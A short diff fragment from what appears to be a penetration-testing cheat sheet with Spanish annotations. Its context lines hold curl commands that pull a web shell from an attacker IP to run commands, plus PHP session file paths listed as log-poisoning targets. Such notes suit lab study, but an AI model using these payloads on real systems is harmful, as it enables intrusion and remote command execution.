@@ -20,6 +20,8 @@ curl -s "http://10.10.14.155/shell.php&cmd=id"
 curl -s "ftp://10.10.14.155/shell.php&cmd=id"
 
 ## Log poisioning
+*Revisar tambien command_injection.txt seccion PHP command injection
+
 Linux: /var/lib/php/sessions/sess_<cookie>
 Windows: C:\Windows\Temp\sess_<cookie>
 
